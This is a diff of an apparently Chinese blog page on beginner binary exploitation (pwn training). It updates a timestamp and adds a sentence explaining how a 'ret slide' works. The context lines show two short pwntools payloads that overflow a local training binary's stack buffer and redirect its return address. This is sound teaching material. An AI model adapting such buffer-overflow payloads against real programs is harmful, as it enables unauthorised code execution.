@@ -29,7 +29,7 @@
 <meta property="og:image" content="http://t1.aixinxi.net/o_1chqi2mer199noqu14qh6h91am1a.png-j.jpg">
 <meta property="og:image" content="http://t1.aixinxi.net/o_1chqiihjr1rcq17u1ba31laa9ra.png-j.jpg">
 <meta property="og:image" content="http://t1.aixinxi.net/o_1chqlhoto1nfehjs1f77upqkdla.png-j.jpg">
-<meta property="og:updated_time" content="2018-07-08T01:05:01.409Z">
+<meta property="og:updated_time" content="2018-07-12T08:33:11.446Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="BIN集训（四）">
 <meta name="twitter:description" content="初涉PWN。">
@@ -411,6 +411,7 @@
 <p>payload如下：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">112</span> + <span class="string">"\x6b\x84\x04\x08"</span></span><br><span class="line">p = process(<span class="string">"./p1"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 <h3 id="Ret-slide"><a href="#Ret-slide" class="headerlink" title="Ret_slide"></a><strong>Ret_slide</strong></h3><p>在不知道返回地址偏移时，通过滑翔机（Ret_slide）设置payload减少尝试次数。即RET前的字符串利用其他RET地址来填充。</p>
+<p>因为RET相当于POP和JMP两个步骤，每次RET都会重新返回到上一个地址，最后执行到目标地址时就会直接跳转。</p>
 <p>payload：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">payload = <span class="string">"\x08\x04\x84\xa0"</span> * <span class="number">28</span> + <span class="string">"\x6b\x84\x04\x08"</span></span><br><span class="line">p = process(<span class="string">"./p1"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 <h2 id="3-13"><a href="#3-13" class="headerlink" title="3-13"></a>3-13</h2><p>程序源码：</p>
